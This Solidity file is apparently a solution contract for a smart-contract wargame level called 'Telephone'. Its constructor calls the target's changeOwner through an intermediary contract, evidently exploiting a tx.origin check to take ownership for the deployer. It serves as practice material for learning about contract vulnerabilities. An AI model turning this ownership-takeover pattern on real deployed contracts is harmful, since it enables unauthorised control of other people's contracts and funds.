// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Telephone/Telephone.sol";

contract TelephoneAttack {
    constructor(address target) public {
        Telephone(target).changeOwner(msg.sender);
    }
}
